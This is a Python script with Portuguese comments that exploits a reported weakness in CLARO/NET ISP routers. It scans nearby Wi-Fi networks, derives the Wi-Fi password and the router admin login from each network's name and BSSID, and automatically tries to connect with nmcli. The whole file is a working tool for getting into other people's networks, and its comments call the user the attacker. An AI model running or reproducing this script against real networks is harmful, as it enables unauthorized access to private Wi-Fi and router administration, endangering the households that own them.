#Script que realiza a busca e dedução de senhas em redes da CLARO NET
#Testado no Kali Linux e Ubuntu
#Vulnerabilidade descoberta por Gabriel Nunes (Perito Cibernético)
#Apresentada no Livro Guerrilha Cibernética
#www.peritocibernetico.com.br
#www.guerrilhacibernetica.com.br



import subprocess



interface = "wlan1" #mude para interface que realizará o scanning e conexão

def conectar(essid,password):
	conn = "nmcli dev wifi connect " + essid + " password " + password + " ifname " + interface
	conexao = subprocess.getoutput(conn)
	if 'successfully' in conexao:
		print('Senha da Rede ' + essid + ' testada com sucesso!')
		return
	if 'found' in conexao:
		print("Atacante possivelmente longe da rede para realizar a conexao")

iwlist = subprocess.getoutput("iwlist wlan1 scan")

iwarray = iwlist.split('\n')

for c,i in enumerate(iwarray):
	if 'Address:' in i:
		bssid = i[i.find('Address:')+9:]
		essid = iwarray[c+5]
		essid = essid[essid.find("\"")+1:-1]
		if 'CLARO_' in essid or 'NET_' in essid:
			pass01 = essid[essid.find('_')+3:]
			pass02 = bssid[6:8]
			password = pass02 + pass01
			if 'CLARO' in essid:
				routeruser = "CLARO_" + pass01
			else:
				routeruser = "NET_" + pass01
			routerpass = bssid.replace(":","")
			routerpass = routerpass[:-2]
			routerpass = routerpass + essid[-2:]
			#print(essid + ":" + bssid + ":" + password)
			print("Nome da rede: " + essid)
			print("BSSID: " + bssid)
			print("Possivel Senha do Wi-Fi: " + password)
			print("Possivel Usuario do Roteador: " + routeruser)
			print("Possivel Senha do Roteador: " + routerpass)
			conectar(essid,password)
			print("\n")


